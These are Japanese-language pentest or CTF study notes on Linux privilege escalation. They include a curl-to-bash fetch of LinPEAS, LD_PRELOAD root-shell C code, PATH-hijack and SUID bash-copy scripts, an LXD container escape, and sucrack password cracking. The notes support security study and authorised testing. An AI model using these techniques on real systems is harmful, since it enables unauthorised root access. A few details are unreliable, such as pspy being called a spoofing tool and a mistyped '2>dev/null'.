# LinPEAS

ローカル権限昇格の手がかりを一覧化してくれるツール。攻撃対象にファイルを転送して実行する必要がある。

```cardlink
url: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
title: "PEASS-ng/linPEAS at master · peass-ng/PEASS-ng"
description: "PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) - peass-ng/PEASS-ng"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://repository-images.githubusercontent.com/165548191/20454080-42d8-11ea-9076-57d151462f64
```
[PEASS-ng/linPEAS at master · peass-ng/PEASS-ng · GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
## 実行
```bash
curl -sSL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" | bash
```
# pspy

linuxにおいて実行されたコマンドをスプーフィングするツール。コマンドの引数にクレデンシャル情報を入力している場合などに有用。実行するOSのアーキテクチャに注意。

```cardlink
url: https://github.com/DominicBreuker/pspy
title: "GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions"
description: "Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account on GitHub."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/5e0fe7b5114ec8cbc4ed5bde2c190868d5cc60006ba3c4fde9d60ef5784ae931/DominicBreuker/pspy
```
[GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)
# GTFOBins
権限昇格に利用可能なコマンド集。

```cardlink
url: https://gtfobins.github.io/
title: "GTFOBins"
host: gtfobins.github.io
favicon: https://gtfobins.github.io/assets/logo.png
```
[GTFOBins](https://gtfobins.github.io/)
# sudo
## sudo -l
`sudo`コマンドに関する権限を表示。
### scripts
`sudo` コマンドで実行可能なスクリプトが存在する場合はGTFOBinsで利用方法を検索する。

Linuxデフォルトのコマンドではない独自のスクリプトが実行可能なときは当該スクリプト内で用いられているライブラリを編集してシェルを埋め込むか、ライブラリの脆弱性を検索する。

一般的にコマンドはカレントディレクトリで実行されるのでコマンド(シェルスクリプト)内の処理において相対パスが用いられている場合はカレントディレクトリが基準となる。そのため相対パスで指定されたファイルと同名のファイルを書き込み権限のあるカレントディレクトリに作成して任意のスクリプトを実行できる可能性がある。
## sudo --version
稀に脆弱性のあるバージョンの場合がある。
## LD_PRELOAD
`sudo -l` コマンドを利用したときの結果において、 `env_keep += LD_PRELOAD` となっている場合はshared librariesを利用することができる。shared librariesはプログラムの実行前に読み込まれ実行される。

上記の内容が利用できる場合は以下のCプログラムをshare objectとしてコンパイル( `.so`拡張子)してsudoで実行する。

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

このコードを `shell.c` として保存してgccを用いてコンパイルする。

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

`LD_PRELOAD` オプションにコンパイルしたファイルのパスを指定して実行する。

findの部分にはsudoを実行できるコマンドを入れる。

```bash
sudo LD_PRELOAD=./shell.so find
```
## ENV
`sudo -l` コマンドの結果でSETENVが有効なコマンドがある場合は環境変数を設定してコマンドを実行できる。
# OS Information
## uname
以下のコマンドでカーネルの情報を表示。
```bash
uname -a
```
### Dirty Cow
CVE-2016-5195

Copy on Write機能を利用した特権昇格の脆弱性。Linux kernelの2.x ~ 4.8.2系が対象。
PoCのリスト

```cardlink
url: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
title: "PoCs"
description: "Dirty COW. Contribute to dirtycow/dirtycow.github.io development by creating an account on GitHub."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/c4926d6f83902078ed1f97009ad8c4b4e15547d371229e422c3f53e51a627f62/dirtycow/dirtycow.github.io
```
[PoCs · dirtycow/dirtycow.github.io Wiki · GitHub](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
### Dirty Pipe
CVE-2022-0847

一般ユーザが任意のファイルの内容を上書きできる特権昇格につながる脆弱性。Linux Kernelの5.8 ~に存在し、5.16.11, 5.15.25, 5.10.102以降で修正。
## hostname
ホスト名を表示。
## /proc/version
カーネルのバージョンを確認。
# Files to Check
## .bash_history
コマンドの実行履歴が残っている可能性。 `history`コマンドでも履歴を参照可能。
## /etc/passwd
ユーザアカウントの確認。
## /etc/hosts
IPアドレスとホスト名の対応の確認。未知のサブドメインが見つかる可能性。
## /etc/sudoers
`sudo`コマンドの権限設定の確認。閲覧にはroot権限が必要なことがほとんど。

任意のシェルスクリプトにおいてsudoで実行されているコマンドが存在し、当該シェルスクリプトを実行した際にパスワードの入力を求められない場合は`/etc/sudoers`の設定などにより当該コマンドについてはパスワードの入力を省略されている可能性があるので同じコマンドをsudoで実行可能。
## /etc/crontab
root権限で定期実行されるタスクの確認。通常rootのみ編集できるが一般ユーザが書き込み権限を持つ場合、任意のコマンドをroot権限で実行することが可能。

またこのファイル内で記述されたスクリプトに対する書き込み権限を持っている場合は任意のコマンドをroot権限で実行することが可能。
## /etc/exports
NFS(Network File System)の設定ファイル。エクスポートするディレクトリと当該ディレクトリにアクセス可能なクライアント(IPアドレスやネットワークなど)が定義される。
`no_root_squash`オプションが付いている場合、クライアントが当該ディレクトリをローカルにマウントしてクライアントのroot権限でアクセスするとマウントされたディレクトリにおいてもroot権限になる。これを用いてSUIDバイナリを置くなどして権限昇格が可能。
## /proc/version
カーネルのバージョンを確認。
# Capabilities
以下のコマンドでcapabilitiesを列挙。
```bash
getcap -r / 2>/dev/null
```
capabilitiesの付いているコマンドをGTFOBinsで検索。
# process
以下のコマンドでroot権限で現在実行されているプロセスを調べる。
```bash
ps auxww | grep root
```
`bash`コマンドで実行されているスクリプトやlinuxの非デフォルトコマンドがある場合は注目。このようなスクリプト・コマンドの情報をさらに調査したりコマンド名とバージョンで脆弱性を探したりする。
## Database
CMSの種類が判明している場合はそのCMSでデフォルトで使用されるDBの種類を調べる。ユーザシェル獲得後、ユーザ権限で当該データベースを操作できる可能性がある。
以下のコマンドでデータベースのプロセスを確認。
```bash
ps aux | grep DB_NAME
```

# SUID/GUID
SUIDが設定されたファイルを探す。
```bash
find / -perm -u=s 2>/dev/null
```
GUIDが設定されたファイルを探す。
```bash
find / -perm -g=s 2>dev/null
```
Linuxデフォルトのコマンドではない見慣れないバイナリがある場合は要チェック。バイナリではなくスクリプト(テキスト)の場合はコードを読んで相対パスでコマンド実行していないかなどを確認。
または`strings`や`ltrace`を用いた静的解析を行う。`ltrace`の場合は当該ファイルをscpなどを用いてローカルにコピーして検証した方が良い。Base64でコピーしたファイルは実行できない場合があることに注意。
# Writable Files
書き込み可能なファイルを探す。
```bash
find / -writable -type f 2>/dev/null
```
書き込み可能なディレクトリを探す。
```bash
find / -writable -type d 2>/dev/null
```
`/var/www`などのディレクトリ内のディレクトリが一般ユーザ権限で書き込み可能な場合で所有者がrootの場合はwebシェルを設置してブラウザ経由でアクセスできる可能性がある。

`/etc/passwd`が書き込み可能な場合はroot権限のユーザを追加。

`/etc/sudoers`や`/etc/shadow`が書き込み可能な場合は任意のユーザに管理者としてのコマンド実行権限付与やrootのパスワード削除や任意の値の設定ができる。

ディレクトリのrwx権限はあるが、当該ディレクトリ内のファイルのrwx権限がない場合は以下の手順でファイルを編集可能。
```bash
mv TARGET_FILE .old
cp .old /tmp/.old
cp /tmp/.old TARGET_FILE
```

自分が所有者であるディレクトリ内に自分の編集権限のないファイルが存在する場合は`rm`や`mv`などを用いて新しい同名のファイルを作成することで実質的に当該ファイルを編集可能。
# Network
## ifconfig
システムのネットワークインターフェース情報を表示。現在のホストのIPアドレスを確認できる。
## ip route
デフォルトゲートウェイを確認。
## netstat
以下のコマンドで内部で開放されているポートを確認できる。
```bash
netstat -ntlp
```

| オプション | 説明                      |
| ----- | ----------------------- |
| -a    | すべてのリスニングポートと確立済の接続を表示  |
| -t    | 表示する情報をTCPプロトコル関連のものに限定 |
| -u    | 表示する情報をUDPプロトコル関連のものに限定 |
| -l    | リスニングモードのポートを表示         |
| -s    | 各プロトコルの状態を表示            |
| -p    | PIDとプログラム名を表示           |
| -i    | インターフェースの情報を表示          |
| -n    | 名前解決を行わない               |
| -o    | タイマーを表示                 |

ブラウザ上で確認できる開放ポートがある場合はローカルからポートフォワードして確認してみる。sshが利用できない場合はchiselも有効。
```bash
ssh -L TARGET_PORT:127.0.0.1:ARBITRARY_PORT TARGET_NAME@TARGET_IP
```
フォワードしたポートにローカルのブラウザからアクセスできない場合はローカルの `/etc/hosts`に `127.0.0.1`とホスト名を対応付ける設定を追加。
簡単に開放ポートの内容を知りたいだけの場合は侵入先でlocalhostとポートを指定してcurlを実行。
DB関連のポートの場合は侵入先でDBのコマンドを実行して接続してみる。
# Path hijack
root権限で実行できるコマンドがある場合、あるいは一般ユーザがrootのSUIDを用いてroot権限で実行できるバイナリやシェルスクリプトの中でコマンドがフルパスではなくコマンド名だけで呼び出されている場合に有効。
環境変数 `$PATH` にはコマンドの保存されているパスがいくつか入っていて、コマンドが実行されると `$PATH` に記述されているコロンで区切られたディレクトリの左から順にコマンドを探す。`
```bash
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
書込み可能なディレクトリパスが `$PATH` 内に指定されている場合はそこに任意のスクリプトを配置することができる。
書込み可能なディレクトリは以下のコマンドなどで検索する。
```bash
find / -writable 2>/dev/null
```
`$PATH` で指定されるディレクトリの多くは `usr` 配下だが、これは書き込み不可能なので書込み可能なことが多い。 `/tmp` を `$PATH` に追加するのが有効。
```bash
export PATH=/tmp:$PATH
```
`/tmp` 内にroot権限で実行できるコマンドと同名のスクリプトを配置する。
スクリプトの内容の一例としては、bashをコピーしてrootのSUIDをセットするものがある。
```sh
#!/bin/sh
cp /bin/sh /tmp/sh; chown root:root /tmp/sh; chmod 4777 /tmp/sh
```
またはシンプルにシェルを起動するコマンド。
```sh
#!/bin/sh
/bin/sh
```
ちなみに `bash`だと環境やランタイム保護の影響でroot権限での実行が拒否される場合があるので `sh`の方が無難。
# sucrack
suコマンドでユーザを切り替える際にパスワードクラックを行うツール。
[https://github.com/hemp3l/sucrack](https://github.com/hemp3l/sucrack)
## 導入手順
ローカルにリポジトリをクローンして圧縮。
```bash
git clone <https://github.com/hemp3l/sucrack>
rm -rf sucrack/.git/
zip sucrack.zip -r sucrack/
```
wget等でターゲットにダウンロードしたら解凍してコンパイル。
```bash
cd /tmp
unzip sucrack.zip
./configure
make
```
以上の手順が完了したら実行可能。
```bash
/tmp/sucrack/src/sucrack
```
# Groups

```cardlink
url: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html
title: "Interesting Groups - Linux Privesc - HackTricks"
host: book.hacktricks.wiki
favicon: ../../../favicon.svg
```
[Interesting Groups - Linux Privesc - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html)
## LXD
Linux Daemon.
システムコンテナマネージャ。
ユーザが `lxd` グループに属している場合は以下の手順で権限昇格が可能。
Alpineイメージをローカルにダウンロード。
```bash
git clone <https://github.com/saghul/lxd-alpine-builder.git>
cd lxd-alpine-builder/
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```
`alpine*****.tar.gz` 形式のファイルが出力されるのでターゲットにアップロードしてイメージをインポート。
```bash
lxc image ./alpine******.tar.gz --alias myimage
```
初期化。この際lxd storage poolをデフォルト値で作っておく。
```bash
lxd init
```
イメージを初期化して `/root` ディレクトリをマウント。
```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
イメージを起動してシェルを起動。
```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
以上の手順でターゲットの `/root` ディレクトリにアクセスできるようになったのでSSHの秘密鍵を取得あるいは追加してフルアクセスを得る。
# Core Dump
プログラムがクラッシュしたときにその時点でのメモリ内容・レジスタ情報・スタック・その他の実行状態をファイルに保存する仕組み。プログラムがクラッシュした原因を特定する手がかりとなるが、メモリに保持されたクレデンシャル情報を取得することができる可能性がある。
シグナル( `SIGSEGV` `SIGABRT` )を受けて異常終了した場合に生成される。
コアダンプファイルは実行中のカレントディレクトリまたは `/var/crash` に保存される。
セキュリティ上の理由から、多くの場合ではコアダンプは無効化されている。現在の設定は以下のコマンドで確認できる。 `0` の場合は無効化されている。
```bash
ulimit -c
```
## apport-unpack
コアダンプのファイルを解凍するコマンド。コアダンプのファイル( `.crash` )は大容量で末尾にbase64エンコードされた長い文字列があり読み取りにくいので、このコマンドを利用して任意のディレクトリに配置する。
解凍後に生成されるコアダンプのファイル名は `CoreDump` 。
```bash
apport-unpack DUMP_FILE DIRECTRY
```
# AppArmor
Linuxシステムにおいてアプリケーションの動作を制限するセキュリティモジュール。各アプリケーションごとにプロファイルを用いてアクセス制御を行う。
プロファイルは `/etc/apparmor.d` に配置される。
設定例
```bash
/usr/sbin/mysqld {
    # 読み取り可能なディレクトリ
    /var/lib/mysql/ r,
    /var/log/mysql/ r,

    # 書き込み可能なファイル
    /var/lib/mysql/** rwk,
    /var/log/mysql/** rwk,

    # 他のシステムリソース制御
    capability sys_nice,
}
```
## Bypass
AppArmorの仕様上、SheBang経由で実行されたアプリケーションに対してはAppArmorの設定が効かない。
```cardlink
url: https://bugs.launchpad.net/apparmor/+bug/1911431
title: "Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmor"
description: "Let's say I want to write a profile to disallow execution of one particular binary (e.g. perl), but otherwise allow everything:_______________________________________________________profile testprofile {    file,    capability,    network,    unix,    signal,    /** ix,  # launch any executable under this same profile    audit deny /usr/bin/perl rwxmlk,}_______________________________________________________Under this profile, it seems like I cannot prevent scripts with a #!/us..."
host: bugs.launchpad.net
favicon: https://bugs.launchpad.net/@@/favicon-32x32.png?v=2022
image: https://bugs.launchpad.net/@@/launchpad-og-image.png
```
[Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmor](https://bugs.launchpad.net/apparmor/+bug/1911431)

Linuxにおいて実行ファイルを動かすときは、 `execve()`システムコールが利用される。これが呼び出されたときカーネルは実行ファイルの実行方法を決定する。実行方法の種類は以下。
- バイナリ形式の実行ファイル
	- そのままプロセスを作って実行
- 先頭がSheBangで始まるスクリプト(テキストファイル)
	- SheBangで指定されたインタープリタを呼び出して実行

例えばスクリプトの先頭が
```shell
#!/usr/bin/python
```
の場合、カーネルは `/usr/bin/python`を起動して引数としてスクリプトを渡す。このとき実行されるプログラムはスクリプト自体ではなく `/usr/bin/python`になる。

AppArmorは適用するプロファイルを決めるとき、実際に起動された実行ファイルのパスを参照する。つまりSheBang経由で実行されたスクリプトのファイルパスは見ずに、そのスクリプトを解釈するインタープリタの実行ファイルを見てプロファイルを適用する。

その結果として、例えば `/home/user/script.py` に対して専用のAppArmorプロファイルを作成してもSheBang経由で実行すると実際に実行されるのは `/usr/bin/python`になる。そのためAppArmorは `scirpt.py`のプロファイルを無視してpythonのプロファイルを適用する。
# Wildcard argument injection

```cardlink
url: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html
title: "Wildcards Spare tricks - HackTricks"
host: book.hacktricks.wiki
favicon: ../../favicon.svg
```
[Wildcards Spare tricks - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
特権で実行されたスクリプトが引用符で囲まれていない `*` とともにバイナリを実行する場合、バイナリのオプションを挿入することができる。

シェルの仕様上バイナリの実行よりも前にワイルドカードが展開されるので `-`で始まる名前のファイルを作成してワイルドカードで読み込ませることによりファイル名がオプションとして解釈される。

利用可能なコマンドは上のHackTricksを参照。
# Library Hijack
## Python
特権実行されるPython スクリプト内で読み込まれているライブラリが書き込み可能な場合は当該ライブラリを書き換えて任意のOSコマンドを実行可能
## PYTHONPATH
root権限で実行されるPythonスクリプトが存在し、その実行時にPYTHONPATHという環境変数が編集可能な場合は当該環境変数に任意のディレクトリを追加し、そのディレクトリに対象のPythonスクリプトがimportしているモジュール名と同名のpythonスクリプトを作成すれば任意のOSコマンドをroot権限で実行可能。
# Configs
`/var/www`や`/opt`ディレクトリ内のconfigファイルにクレデンシャル情報が含まれている可能性。

`grep -ri passw PATH 2>/dev/null`を実行して任意のディレクトリ内にpassword/passwdという文字列を含むファイルがないか調べることができる。
# Symlink
特定のディレクトリ内のみにアクセスが限定されている場合はシンボリックリンクを利用して迂回できる可能性。
# Git
`.git`ディレクトリが存在するディレクトリはGitレポジトリの可能性が高い。

以下のコマンドでクレデンシャル情報などを探す。
コミット履歴確認
```bash
git log
```
コミット内容確認
```bash
git show COMMIT_ID
```
ブランチ列挙
```bash
git branch -a
```

`.git`ディレクトリ内の`hooks`ディレクトリにはcommitやpushなどのタイミングで自動実行されるコマンドを定義するファイルがあるのでroot権限でgitの操作が行われている場合はこれらのファイルを編集してroot権限で任意のコマンドを実行できる可能性。
# Privileged Command Execution
## Bash Copy
何らかの方法でroot権限でコマンドを実行できる場合は以下の方法で一般ユーザがroot権限のシェルを取得可能。
root権限で以下のコマンドを実行。
```bash
cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 4777 /tmp/bash
```
一般ユーザ権限でコピーしたbashを実行。
```bash
/tmp/bash -p
```
## SSH Key
`/root/.ssh`ディレクトリ内の秘密鍵を取得する。
# less
sudo権限で実行したコマンドがlessコマンドのようなページャーを内部で使用している場合は`!/bin/bash`を入力することでroot権限を取得可能。
# mount
マウントされたデバイスの一覧は`mount`または`lsblk`コマンドで確認可能。

USBデバイスは通常`/media`ディレクトリにマウントされる。

# Forensics
削除されたデータを復元する場合は当該データが存在するディスクを指定して`strings`や`grep -aPo`コマンドを実行することでバイナリデータからテキストを抽出する。grepを用いる場合は正規表現が有効。

`extundelete`や`testdisk`などのコマンドを用いても復元できる可能性がある。
# Others
## motd
ユーザがログインしたタイミング(新しいセッションが開始する)で実行されるので任意のOSコマンド実行に繋がる可能性
### CVE-2010-0832

```cardlink
url: https://www.exploit-db.com/exploits/14339
title: "Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)"
description: "Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2). CVE-2010-0832 . local exploit for Linux platform"
host: www.exploit-db.com
favicon: https://www.exploit-db.com/favicon.ico
image: https://www.exploit-db.com/images/spider-orange.png
```
[Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) - Linux local Exploit](https://www.exploit-db.com/exploits/14339)